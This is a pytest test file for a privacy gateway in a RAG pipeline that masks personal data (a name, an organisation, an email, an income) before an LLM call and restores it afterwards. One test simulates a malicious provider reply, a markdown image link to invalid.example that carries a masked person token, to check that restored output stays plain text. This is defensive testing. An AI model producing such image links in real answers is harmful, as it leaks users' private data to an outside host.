from __future__ import annotations

import json
from dataclasses import replace

import pytest

from secure_rag.config import load_config
from secure_rag.models import EntitySpan, RetrievalHit
from secure_rag.pipeline import SecureRagPipeline
from secure_rag.providers import OpenAIResponsesProvider
from secure_rag.sanitization.core import PrivacyGateway
from secure_rag.sanitization.ner import EnsembleDetector
from secure_rag.sanitization.regex import RegexDetector


class LiteralDetector:
    name = "literal"

    def detect(self, text: str) -> list[EntitySpan]:
        values = {"Анна Смирнова": "PER", "СибНИА": "ORG"}
        result = []
        for value, label in values.items():
            start = text.find(value)
            if start >= 0:
                result.append(
                    EntitySpan(
                        start=start,
                        end=start + len(value),
                        label=label,
                        score=1.0,
                        source=self.name,
                        priority=500,
                    )
                )
        return result


class FakeEmbedder:
    model_version = "fake@1"


class FakeRetriever:
    embedder = FakeEmbedder()

    def search(
        self,
        _query: str,
        top_k: int | None = None,
        *,
        on_event=None,
    ) -> list[RetrievalHit]:
        del on_event
        return [
            RetrievalHit(
                chunk_id="00000000-0000-0000-0000-000000000001",
                document_id="opaque-document",
                revision="revision",
                score=0.91,
                start=0,
                end=120,
                text=(
                    "Анна Смирнова работает в СибНИА. Email test@example.org. "
                    "Доход 1000000 рублей."
                ),
                source_name="Личное дело Анны.docx",
            )
        ]


class FakeManifest:
    def latest_build_id(self) -> str:
        return "build-test"


def test_full_stub_flow_keeps_raw_values_out_of_codex_file(tmp_path) -> None:
    base = load_config()
    config = replace(
        base,
        paths=replace(base.paths, runtime_root=(tmp_path / "runtime").resolve()),
    )
    config.ensure_runtime()
    gateway = PrivacyGateway(EnsembleDetector([RegexDetector(), LiteralDetector()]))
    pipeline = SecureRagPipeline(config, FakeRetriever(), gateway, FakeManifest())
    result = pipeline.run("Что известно про анна смирнова?", provider="stub")

    outbound = result.codex_input.read_text(encoding="utf-8")
    restored = result.restored_output.read_text(encoding="utf-8")
    assert result.restored_output.suffix == ".txt"
    assert "анна смирнова" not in outbound.casefold()
    assert "СибНИА" not in outbound
    assert "test@example.org" not in outbound
    assert "1000000 рублей" not in outbound
    assert "Личное дело Анны.docx" not in outbound
    assert "[[PER_0001]]" in outbound
    assert "Анна Смирнова" in restored
    assert "test@example.org" in restored


def test_provider_controlled_link_is_restored_only_to_plain_text(tmp_path, monkeypatch) -> None:
    base = load_config()
    config = replace(
        base,
        paths=replace(base.paths, runtime_root=(tmp_path / "runtime").resolve()),
    )
    config.ensure_runtime()
    gateway = PrivacyGateway(EnsembleDetector([LiteralDetector()]))

    def malicious_answer(self, payload: str, request_id: str) -> str:
        del self, payload, request_id
        return "![x](https://invalid.example/?value=[[PER_0001]])\n"

    monkeypatch.setattr(OpenAIResponsesProvider, "answer_payload", malicious_answer)
    monkeypatch.setenv("OPENAI_API_KEY", "test-key")
    result = SecureRagPipeline(
        config,
        FakeRetriever(),
        gateway,
        FakeManifest(),
    ).run("Что известно про Анну Смирнову?", provider="responses")

    restored = result.restored_output.read_text(encoding="utf-8")
    assert result.restored_output.name == "restored_answer.txt"
    assert "https://invalid.example/?value=Анна Смирнова" in restored


def test_auto_falls_back_to_local_stub_without_api_key(
    tmp_path, monkeypatch
) -> None:
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    base = load_config()
    config = replace(
        base,
        paths=replace(base.paths, runtime_root=(tmp_path / "runtime").resolve()),
    )
    config.ensure_runtime()
    gateway = PrivacyGateway(EnsembleDetector([RegexDetector(), LiteralDetector()]))

    result = SecureRagPipeline(
        config,
        FakeRetriever(),
        gateway,
        FakeManifest(),
    ).run("Что известно про Анну Смирнову?", provider="auto")

    assert result.provider == "stub"
    assert result.restored_output.exists()
    manifest = json.loads((result.request_dir / "manifest.json").read_text(encoding="utf-8"))
    assert manifest["provider_boundary"] == "local-deterministic"
    assert manifest["pilot_auto_send"] is False


def test_responses_provider_is_automatic_and_demarks_response(tmp_path, monkeypatch) -> None:
    base = load_config()
    config = replace(
        base,
        paths=replace(base.paths, runtime_root=(tmp_path / "runtime").resolve()),
    )
    config.ensure_runtime()
    gateway = PrivacyGateway(EnsembleDetector([RegexDetector(), LiteralDetector()]))

    def fake_answer(self, payload: str, request_id: str) -> str:
        assert "Анна Смирнова" not in payload
        assert request_id in payload
        return "Ответ относится к [[PER_0001]].\n"

    monkeypatch.setattr(OpenAIResponsesProvider, "answer_payload", fake_answer)
    monkeypatch.setenv("OPENAI_API_KEY", "test-key")
    result = SecureRagPipeline(
        config,
        FakeRetriever(),
        gateway,
        FakeManifest(),
    ).run("Что известно про Анну Смирнову?", provider="responses")

    assert "Анна Смирнова" in result.restored_output.read_text(encoding="utf-8")
    manifest = json.loads((result.request_dir / "manifest.json").read_text(encoding="utf-8"))
    assert manifest["pilot_auto_send"] is True
    assert manifest["human_review_required"] is False
    assert manifest["provider_boundary"] == "no-tools-api"


def test_provider_response_can_be_restored_after_ui_interrupt(tmp_path, monkeypatch) -> None:
    class SyntheticUiInterrupt(BaseException):
        pass

    base = load_config()
    config = replace(
        base,
        paths=replace(base.paths, runtime_root=(tmp_path / "runtime").resolve()),
    )
    config.ensure_runtime()
    gateway = PrivacyGateway(EnsembleDetector([RegexDetector(), LiteralDetector()]))

    def fake_answer(self, payload: str, request_id: str) -> str:
        del self, payload, request_id
        return "Ответ относится к [[PER_0001]].\n"

    def interrupt_after_persist(event) -> None:
        if event.stage == "provider.call" and event.status == "completed":
            raise SyntheticUiInterrupt

    monkeypatch.setattr(OpenAIResponsesProvider, "answer_payload", fake_answer)
    monkeypatch.setenv("OPENAI_API_KEY", "test-key")
    pipeline = SecureRagPipeline(config, FakeRetriever(), gateway, FakeManifest())

    with pytest.raises(SyntheticUiInterrupt):
        pipeline.run(
            "Что известно про Анну Смирнову?",
            provider="responses",
            on_event=interrupt_after_persist,
        )

    request_dirs = list(config.requests_path.iterdir())
    assert len(request_dirs) == 1
    request_id = request_dirs[0].name
    manifest = json.loads(
        (request_dirs[0] / "manifest.json").read_text(encoding="utf-8")
    )
    assert manifest["status"] == "response_received"
    assert (request_dirs[0] / "codex_output.txt").stat().st_size > 0
    assert not (request_dirs[0] / "restored_answer.txt").exists()

    restored = pipeline.bridge.restore_staged(request_id)

    assert "Анна Смирнова" in restored.read_text(encoding="utf-8")


@pytest.mark.parametrize("restore_method", ["restore_text", "restore_file"])
def test_manual_restore_validates_provider_output_before_demark(
    tmp_path, restore_method: str
) -> None:
    base = load_config()
    config = replace(
        base,
        paths=replace(base.paths, runtime_root=(tmp_path / "runtime").resolve()),
    )
    config.ensure_runtime()
    gateway = PrivacyGateway(EnsembleDetector([LiteralDetector()]))
    pipeline = SecureRagPipeline(config, FakeRetriever(), gateway, FakeManifest())
    result = pipeline.run("Что известно про Анну Смирнову?", provider="manual")
    marked_text = "Анна Смирнова [[FOREIGN_0001]]\n"

    with pytest.raises(
        ValueError,
        match="^Outbound validation found a known unmarked value$",
    ):
        if restore_method == "restore_file":
            result.codex_output.write_text(marked_text, encoding="utf-8")
            pipeline.bridge.restore_file(result.request_id)
        else:
            pipeline.bridge.restore_text(result.request_id, marked_text)

    assert not result.restored_output.exists()
